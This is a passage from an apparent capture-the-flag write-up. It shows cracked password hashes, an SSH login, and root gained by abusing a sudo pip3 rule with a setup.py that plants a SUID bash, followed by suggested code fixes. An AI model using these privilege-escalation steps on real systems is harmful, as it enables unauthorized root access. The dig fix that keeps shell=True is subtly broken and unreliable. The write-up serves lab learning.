Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:admin
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: hash.txt
Time.Started.....: Sun May  7 09:36:47 2023 (2 secs)
Time.Estimated...: Sun May  7 09:36:49 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4796.9 kH/s (0.26ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 10540032/14344384 (73.48%)
Rejected.........: 0/10540032 (0.00%)
Restore.Point....: 10536960/14344384 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany93 -> ThatGuy9
Hardware.Mon.#1..: Util: 46%

Started: Sun May  7 09:36:46 2023
Stopped: Sun May  7 09:36:51 2023
```

I used john's password to SSH to the server.

```bash
$ ssh john@target
john@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 07 May 2023 01:38:29 PM UTC

  System load:           0.38
  Usage of /:            82.4% of 6.23GB
  Memory usage:          46%
  Swap usage:            0%
  Processes:             254
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.210
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5952


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun May  7 13:38:23 2023 from 10.10.14.3
john@only4you:~$ ls
user.txt
john@only4you:~$ cat user.txt
REDACTED
```

## Getting root

After I connected, I checked if I could run anything with sudo.

```bash
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

I could use `pip3` t download packages from the local Gogs installation.

I used SSH to create a tunnel on port 3000.

```bash
$ ssh -L 3000:localhost:3000 john@target
```

I opened the Gogs site and connected with jonh's credentials.

![Gogs Connected](/assets/images/2023/08/OnlyForYou/GogsConnected.png "Gogs Connected")

There was one repository called Test. But it was private, so pip could not use it. I went to the repository setting to make it public.

![Make Repository Public](/assets/images/2023/08/OnlyForYou/MakeRepoPublic.png "Make Repository Public")

Now pip could access the repository. I checked on [GTFOBins](https://gtfobins.github.io/gtfobins/pip/) and saw that code in `setup.py` would get executed on installation. I created a small script that copied bash in `/tmp` and set the suid bit on it.

```bash
john@only4you:~$ cat setup.py
#!/usr/bin/python3
import os
os.system('cp /bin/bash /tmp')
os.system('chmod u+s /tmp/bash')

john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/archive/master.tar.gz
Collecting http://127.0.0.1:3000/john/Test/archive/master.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/archive/master.tar.gz (340 bytes)
ERROR: Files/directories not found in /tmp/pip-req-build-9evz475i/pip-egg-info

john@only4you:~$ ls -ltr /tmp/
total 9612
...

drwx------ 3 john     john        4096 May  7 14:11 pip-req-build-raq30zoy
drwx------ 3 john     john        4096 May  7 14:11 pip-req-build-3nxnh2fm
drwx------ 3 john     john        4096 May  7 14:12 pip-req-build-5l3_dyvu
drwx------ 3 john     john        4096 May  7 14:13 pip-req-build-nay7j_rc
drwx------ 3 root     root        4096 May  7 14:14 pip-req-build-pf28kal6
drwx------ 3 root     root        4096 May  7 14:16 pip-req-build-9evz475i
-rwsr-xr-x 1 root     root     1183448 May  7 14:16 bash
```

I ran it to become root, and read the flag.
```bash
john@only4you:~$ /tmp/bash -p

bash-5.0# whoami
root

bash-5.0# cat /root/root.txt
REDACTED
```

## Mitigations

The first fix on this box is in the beta application. Most of the code already sanitize the filename. But for some reason, the download function does not do it the same way. Calling secure_filename there would have prevented me from reading the other application source code.

```python
def download():
    image = request.form['image']
    filename = secure_filename(image)
```

Next, the regex used to validate the email would have been safer if it used anchor to make sure it matches the entire strings. The call to dig should also use parameterization instead of building a string with user input.

```python
def issecure(email, ip):
	#if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
	if not re.match("^([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})$", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		#result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		result = run(["dig", "txt", domain], shell=True, stdout=PIPE)
```

The internal application was also appending user input, this time to the Cypher query it built. It should have used Parameterized Queries to prevent the injection. The login code was already doing that.

```python
def findEmployee(tx, name):
    data = []
    i = 0
    results = tx.run("MATCH (n:employee) "
                    #"WHERE n.name contains '"+ name +"' "
                    #"RETURN n.name AS name, n.salary AS salary, n.country AS country, n.city AS city")
                    "WHERE n.name contains $name "
                    "RETURN n.name AS name, n.salary AS salary, n.country AS country, n.city AS city", name=name)
```

The last issue was with the capability to use pip with sudo. If a user is allowed to install code on a server, this user can take over the box. Only trusted users should have that kind of permission. They should have strong passwords that are not leaked. And sudo should require to enter the password before doing something like this.
